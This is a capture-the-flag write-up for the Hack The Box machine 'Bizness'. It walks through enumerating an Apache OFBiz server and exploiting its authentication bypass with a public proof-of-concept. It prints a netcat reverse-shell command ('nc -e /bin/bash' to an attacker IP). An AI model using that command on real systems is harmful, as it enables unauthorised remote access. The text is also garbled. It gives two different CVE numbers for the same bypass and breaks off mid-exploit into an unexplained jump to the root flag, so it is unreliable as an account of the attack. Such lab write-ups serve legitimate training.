Bizness is a Easy Linux machine initially released on January 6th, 2024. As usual, I start with basic enumeration using Nmap; and from there used `dirsearch` for directory enumeration. From directory enumeration we find a login page running Apache OFBiz. This version of Apache OFBiz is vulnerable to an authentication bypass vulnerability [CVE-2023-51497](https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/). From here, using a public PoC script found on github, we are then able to leverage CVE-2023-49070 to get remote code execution and get a shell on the machine as the `ofbiz` user.

## Enumeration
```bash
nmap -sV 10.10.11.252
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 06:01 UTC
Nmap scan report for 10.10.11.252
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.40 seconds
```

Ports Open:
`22, 80, 443`

When navigating the IP in the browser, `bizness.htb` is the domain that is shown. Let's go ahead and add this to `/etc/hosts`
```bash
echo '10.10.11.252 bizness.htb' | sudo tee -a /etc/hosts           
10.10.11.252 bizness.htb
```

Next moving on to directory enumeration, after a bit of trial and error I tried `dirsearch`.
```bash
dirsearch -u https://bizness.htb/
```
From this step of enumeration, the endpoint containing the Vulnerable login was found:
```
https://bizness.htb/solr/control/checkLogin/
```
- Apache OFBiz Authentication Bypass Vulnerability (CVE-2023-51467 and CVE-2023-49070)

### CVE-2023-49070
The Apache OFBiz Enterprise Resource Planning (ERP) system, a Java based web framework used across many industries. The SonicWall Threat research team's [discovery](https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/) of **CVE-2023-51467**, a severe authentication bypass vulnerability with a CVSS score of 9.8, has unveiled an alarming risk to the system's integrity. This vulnerability not only exposes the ERP system to potential exploitation but also opens the door to a Server-Side Request Forgery (SSRF) exploit, presenting a dual threat to organizations relying on Apache OFBiz.
[CVE-2023-51467 and CVE-2023-49070 PoC](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass?source=post_page-----b0045ddbc33a--------------------------------)

### Shell as ofbiz
Using the `exploit.py` script from the PoC above, I was able to get a shell as `ofbiz`.
```bash
python exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.16.9 6969'
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

we found some important data during enumeration.

Using the login and password we now get the root flag!
